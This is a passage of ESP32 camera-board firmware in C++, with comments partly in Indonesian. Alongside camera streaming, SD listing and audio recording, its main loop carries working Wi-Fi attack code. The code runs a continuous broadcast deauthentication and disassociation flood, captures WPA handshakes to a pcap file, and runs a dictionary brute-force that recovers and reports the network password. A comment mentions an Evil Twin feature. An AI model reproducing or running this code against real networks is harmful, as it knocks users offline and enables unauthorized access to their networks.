  recLastFrameSig = 0;
}

static bool xiaoIsTxtPath(const String &path) {
  String low = path;
  low.toLowerCase();
  return low.endsWith(".txt");
}

static String xiaoNormalizePath(const String &dirPath, const String &entryName) {
  String full = entryName;
  if (!full.startsWith("/")) {
    if (dirPath == "/") full = "/" + full;
    else full = dirPath + "/" + full;
  }
  return full;
}

static void xiaoSendDictItem(const String &dictPath, uint16_t seq) {
  uint8_t payload[130];
  memset(payload, 0, sizeof(payload));
  payload[0] = 1; // item follows
  payload[1] = (uint8_t)(seq & 0xFF);

  size_t nameLen = dictPath.length();
  if (nameLen > 120) nameLen = 120;
  memcpy(&payload[2], dictPath.c_str(), nameLen);
  sendPacket(PKT_CRACK_DICT_RES, payload, (uint16_t)(2 + nameLen));
}

static void xiaoReportDictRecursive(const String &dirPath, uint16_t &seq) {
  File dir = SD.open(dirPath, FILE_READ);
  if (!dir || !dir.isDirectory()) {
    if (dir) dir.close();
    return;
  }

  File file = dir.openNextFile();
  while (file) {
    String fullPath = xiaoNormalizePath(dirPath, String(file.name()));
    if (file.isDirectory()) {
      file.close();
      xiaoReportDictRecursive(fullPath, seq);
    } else {
      if (xiaoIsTxtPath(fullPath)) {
        xiaoSendDictItem(fullPath, seq);
        seq++;
        delay(8); // Give UART some breathing room
      }
      file.close();
    }
    file = dir.openNextFile();
    yield();
  }
  dir.close();
}

static bool xiaoFindFirstTxtRecursive(const String &dirPath, String &outPath, uint8_t depth = 0) {
  if (depth > 10) return false;

  File dir = SD.open(dirPath, FILE_READ);
  if (!dir || !dir.isDirectory()) {
    if (dir) dir.close();
    return false;
  }

  File file = dir.openNextFile();
  while (file) {
    String fullPath = xiaoNormalizePath(dirPath, String(file.name()));
    if (file.isDirectory()) {
      file.close();
      if (xiaoFindFirstTxtRecursive(fullPath, outPath, depth + 1)) {
        dir.close();
        return true;
      }
    } else {
      if (xiaoIsTxtPath(fullPath)) {
        outPath = fullPath;
        file.close();
        dir.close();
        return true;
      }
      file.close();
    }
    file = dir.openNextFile();
    yield();
  }

  dir.close();
  return false;
}

static bool xiaoResolveDictSelection(String &dictPath) {
  dictPath.trim();
  if (dictPath.length() > 0 && !dictPath.startsWith("/")) {
    dictPath = "/" + dictPath;
  }

  if (dictPath.length() > 0 && xiaoIsTxtPath(dictPath) && SD.exists(dictPath)) {
    return true;
  }

  String detectedPath = "";
  if (!xiaoFindFirstTxtRecursive("/", detectedPath, 0)) {
    return false;
  }

  dictPath = detectedPath;
  return true;
}

void setup() {
  Serial.begin(115200);
  delay(400);

  Serial.printf("PSRAM found: %s\n", psramFound() ? "YES" : "NO");
  Serial.printf("PSRAM size : %u\n", ESP.getPsramSize());

  Serial1.setRxBufferSize(16384);
  Serial1.begin(CAM_UART_BAUD, SERIAL_8N1, CAM_UART_RX_PIN, CAM_UART_TX_PIN);

  (void)initSdCard();
  (void)initMic();

  if (!initCameraMode(false, false)) {
    Serial.println("Camera init failed, restarting...");
    delay(2000);
    ESP.restart();
  }

  Serial.println("UART RGB565 sender ready.");
}

void loop() {
  static uint8_t recPreviewCounter = 0;
  bool captureRequested = false;
  bool recStartRequested = false;
  bool recStopRequested = false;
  bool listRequested = false;
  bool audioStartRequested = false;
  bool audioStopRequested = false;
  bool audioPauseRequested = false;
  bool audioResumeRequested = false;
  bool wifiScanRequested = false;
  (void)pollControlCommand(captureRequested, recStartRequested, recStopRequested, listRequested, audioStartRequested, audioStopRequested, audioPauseRequested, audioResumeRequested, wifiScanRequested);
  for (uint8_t i = 0; i < 12 && Serial1.available() > 0; i++) {
    bool c2 = false;
    bool rs2 = false;
    bool rt2 = false;
    bool ls2 = false;
    bool as2 = false;
    bool ao2 = false;
    bool ap2 = false;
    bool ar2 = false;
    bool ws2 = false;
    if (!pollControlCommand(c2, rs2, rt2, ls2, as2, ao2, ap2, ar2, ws2)) break;
    captureRequested = captureRequested || c2;
    recStartRequested = recStartRequested || rs2;
    recStopRequested = recStopRequested || rt2;
    listRequested = listRequested || ls2;
    audioStartRequested = audioStartRequested || as2;
    audioStopRequested = audioStopRequested || ao2;
    audioPauseRequested = audioPauseRequested || ap2;
    audioResumeRequested = audioResumeRequested || ar2;
    wifiScanRequested = wifiScanRequested || ws2;
  }

  // --- FULL THROTTLE DEAUTH ATTACK ---
  if (deauthActive) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    // Blast 10 burst x 2 packets (Deauth + Disassoc) = 20 frames per cycle
    for(int i = 0; i < 10; i++) { 
      xiaoPerformDeauth(broadcast, deauthTarget);
      // Give minimal 1ms for the hardware driver to flush its TX rings.
      // Jika queue penuh, efektivitas akan hancur dan CPU hang.
      delay(1); 
    }
    
    deauthPkts += 20; 
    
    // Kirim stats kembali ke Matrix board setiap ~500ms
    uint32_t now = millis();
    if (now - deauthLastSendMs >= 500) {
      sendPacket(PKT_DEAUTH_ATK_STAT, (uint8_t*)&deauthPkts, sizeof(uint32_t));
      deauthLastSendMs = now;
    }
    
    // RETURN DI SINI = MEMATIKAN SEMUA SERVIS LAIN (SD CARD, AUDIO, CAMERA!)
    // CPU fokus 100% pada penyerangan & sniffer. xiaoWebTick dan I2S Audio Diskip!
    return; 
  }
  // --- UJUNG FULL THROTTLE DEAUTH ATTACK ---

    // (Evil Twin moved to Matrix natively)

    // -----------------------------------------
    // --- WPA CRACKER: REPORT DICTIONARIES  ---
    // -----------------------------------------
    if (xiaoReportDict) {
      xiaoReportDict = false;
      uint16_t seq = 0;
      xiaoReportDictRecursive("/", seq);
      sendStatusText(String("WPA_DICT total_txt=") + String((unsigned long)seq));
      uint8_t endPayload[2] = {0, 0};
      sendPacket(PKT_CRACK_DICT_RES, endPayload, 2);
    }

    // -----------------------------------------
    // --- WPA CRACKER: HANDSHAKE CAPTURE    ---
    // -----------------------------------------
    if (wpaCaptureActive) {
      uint32_t now = millis();
      if (now - wpaLastStatMs >= 500) {
        wpaLastStatMs = now;
        uint8_t payload[2];
        payload[0] = 1; // 1 = Capture Mode
        payload[1] = wpaHandshakeFound ? 1 : 0; // 0 = Scanning, 1 = Found
        sendPacket(PKT_CRACK_STAT, payload, 2);
      }

      if (now - wpaLastInsightMs >= 900 || wpaHandshakeFound) {
        wpaLastInsightMs = now;
        String state = "WAIT_TRAFFIC";
        if (wpaHandshakeFound) state = "HS_OK";
        else if (wpaCapSawM1 && !wpaCapSawM2) state = "M1_OK_WAIT_M2";
        else if (wpaCapSawM2 && !wpaHandshakeFound) state = "M2_SEEN_WAIT_HS";
        else if (wpaCapEapolFrames > 0) state = "EAPOL_SEEN";
        else if (wpaCapSawTraffic) state = "DATA_SEEN_WAIT_EAPOL";

        sendStatusText(String("WPA_CAP state=") + state +
                       " ch=" + String((unsigned long)wpaCaptureChannel) +
                       " data=" + String((unsigned long)wpaCapDataFrames) +
                       " eapol=" + String((unsigned long)wpaCapEapolFrames) +
                       " m1=" + String(wpaCapSawM1 ? "1" : "0") +
                       " m2=" + String(wpaCapSawM2 ? "1" : "0") +
                       " hs=" + String(wpaHandshakeFound ? "1" : "0"));
      }

      if (wpaHandshakeFound) {
        uint8_t payload[2] = {1, 1};
        sendPacket(PKT_CRACK_STAT, payload, 2);
        xiaoStopWpaCapture();
        sendStatusText(String("WPA_CAP state=CAP_DONE ch=") + String((unsigned long)wpaCaptureChannel) +
                       " data=" + String((unsigned long)wpaCapDataFrames) +
                       " eapol=" + String((unsigned long)wpaCapEapolFrames) +
                       " m1=" + String(wpaCapSawM1 ? "1" : "0") +
                       " m2=" + String(wpaCapSawM2 ? "1" : "0") +
                       " hs=1");
      }

      // PCAP Queue writer
      while (pcapActive && pcapFile && pcapHead != pcapTail) {
        uint8_t saveBuf[256 + 16];
        uint32_t ts_sec = pcapQueue[pcapTail].ts / 1000;
        uint32_t ts_usec = (pcapQueue[pcapTail].ts % 1000) * 1000;
        uint16_t plen = pcapQueue[pcapTail].len;

        memcpy(&saveBuf[0], &ts_sec, 4);
        memcpy(&saveBuf[4], &ts_usec, 4);
        uint32_t len32 = plen;
        memcpy(&saveBuf[8], &len32, 4);
        memcpy(&saveBuf[12], &len32, 4);
        memcpy(&saveBuf[16], pcapQueue[pcapTail].data, plen);

        pcapFile.write(saveBuf, 16 + plen);
        pcapTail = (pcapTail + 1) % PCAP_Q_SIZE;
      }
      if (pcapActive && pcapFile) {
        pcapFile.flush();
      }

      if (wpaCaptureActive) return; // Dedikasi CPU! Jangan melayani web / audio recording
    }

    // -----------------------------------------
    // --- WPA CRACKER: DICTIONARY BRUTEFORCER -
    // -----------------------------------------
    if (wpaCrackActive && !wpaCrackDone) {
      if (!xiaoCrackBoostActive) {
        xiaoEnterCrackBoost();
      }

      if (!wpaDictHandle) {
        if (!xiaoResolveDictSelection(wpaDictFile)) {
          // File gagal dibuka
          wpaCrackDone = true;
          sendStatusText("WPA_CRACK no .txt dictionary found");
        } else {
          wpaDictHandle = SD.open(wpaDictFile, FILE_READ);
          if (!wpaDictHandle) {
            // File gagal dibuka
            wpaCrackDone = true;
            sendStatusText(String("WPA_CRACK open fail ") + wpaDictFile);
          }
        }
      }

      if (wpaDictHandle) {
        int linesPerLoop = WPA_CRACK_LINES_PER_LOOP;
        for (int i = 0; i < linesPerLoop; i++) {
          if (!wpaDictHandle.available()) {
            wpaCrackDone = true;
            wpaDictHandle.close();
            break;
          }

          String pwd = wpaDictHandle.readStringUntil('\n');
          pwd.trim(); // Hapus \r jika ada (Windows format crlf)

          if (pwd.length() > 0) {
            wpaCrackChecked++;
            bool match = xiaoWpaCheckPassword(pwd.c_str(), wpaTargetSsid.c_str(), wpaTargetBssid, wpaTargetStation, wpaAnonce, wpaSnonce, wpaEapolFrame, wpaEapolSize, wpaMic);
            if (match) {
              wpaCrackPassword = pwd;
              wpaCrackDone = true;
              wpaDictHandle.close();
              break;
            }
          }

          if ((i & 0x03) == 0) {
            yield();
          }
        }
      } // end if (wpaDictHandle)

      uint32_t now = millis();
      if (now - wpaLastStatMs >= 1500 || wpaCrackDone) {
        wpaLastStatMs = now;
        uint8_t payload[70];
        memset(payload, 0, 70);
        payload[0] = 2; // 2 = Crack Mode
        
        if (!wpaCrackDone) {
          payload[1] = 0; // Running
        } else {
          if (wpaCrackPassword.length() > 0) payload[1] = 1; // Found!
          else payload[1] = 2; // Not Found / Done
        }
        
        memcpy(&payload[2], &wpaCrackChecked, 4);
        
        uint16_t len = 6;
        if (wpaCrackPassword.length() > 0) {
          strncpy((char*)&payload[6], wpaCrackPassword.c_str(), 60);
          len += wpaCrackPassword.length();
        }
        sendPacket(PKT_CRACK_STAT, payload, len);
      }

      if (wpaCrackDone) {
        xiaoExitCrackBoost();
      }
      return; // Dedikasi CPU pada hash loop (hindari web/audio interupsi)
    }

  xiaoWebTick();
  xiaoAudioRecStep();

  if (wifiScanRequested) {
    xiaoHandleWifiScan();
  }


  if (xiaoWebRunning && !recordingActive) {
    delay(3);
    return;
  }

  if (listRequested) {
    streamPauseUntilMs = millis() + 320;
    sendSdList();
  }

  if (recStartRequested) {
    (void)startRecording();
  }

  if (recStopRequested) {
    stopRecording(true);
  }

  if (audioStartRequested) {
    (void)xiaoStartAudioRec();
  }

  if (audioStopRequested) {
    xiaoStopAudioRec();
  }

  if (audioPauseRequested) {
    xiaoPauseAudioRec();
  }

  if (audioResumeRequested) {
    xiaoResumeAudioRec();
  }

  if (captureRequested) {
    if (recordingActive) stopRecording(true);
    runRemoteCapture3mp();
    return;
  }

  if ((int32_t)(streamPauseUntilMs - millis()) > 0) {
    if (recordingActive) recordingStep(nullptr);
    maybeRecoverRecordingCamera();
    delay(3);
    return;
  }

  camera_fb_t *fb = esp_camera_fb_get();
  if (!fb) {
    if (recordingActive) recordingStep(nullptr);
    maybeRecoverRecordingCamera();
    delay(20);
    return;
  }

  if (fb->width != CAM_W || fb->height != CAM_H || fb->format != PIXFORMAT_RGB565) {
    esp_camera_fb_return(fb);
    if (recordingActive) recordingStep(nullptr);
    maybeRecoverRecordingCamera();
    delay(30);
    return;
  }

  if (recordingActive) {
    recordingStep(fb);
    maybeRecoverRecordingCamera();
  }

  bool sendLiveFrame = true;
  if (recordingActive) {
    if (REC_DISABLE_LIVE_STREAM_WHILE_RECORDING) {
      sendLiveFrame = false;
    } else {
      recPreviewCounter++;
      if (recPreviewCounter < REC_PREVIEW_EVERY_N_FRAMES) {
        sendLiveFrame = false;
      } else {
        recPreviewCounter = 0;
      }
    }
  } else {
    recPreviewCounter = 0;
  }

  if (!sendLiveFrame) {
    esp_camera_fb_return(fb);
    delay(1);
    return;
  }

  uint8_t startPayload[4] = {
    (uint8_t)(CAM_W & 0xFF),
    (uint8_t)((CAM_W >> 8) & 0xFF),
    (uint8_t)(CAM_H & 0xFF),
    (uint8_t)((CAM_H >> 8) & 0xFF)
  };
  sendPacket(PKT_FRAME_START, startPayload, sizeof(startPayload));

  const uint16_t lineBytes = CAM_W * 2;
  uint8_t linePacket[2 + CAM_W * 2];
  for (uint16_t y = 0; y < CAM_H; y++) {
    linePacket[0] = (uint8_t)(y & 0xFF);
    linePacket[1] = (uint8_t)((y >> 8) & 0xFF);
    memcpy(linePacket + 2, fb->buf + (size_t)y * lineBytes, lineBytes);
    sendPacket(PKT_LINE, linePacket, (uint16_t)(2 + lineBytes));
  }

  sendPacket(PKT_FRAME_END, nullptr, 0);
  esp_camera_fb_return(fb);

  delay((recordingActive || xiaoAudioRecActive) ? 1 : 90);
}
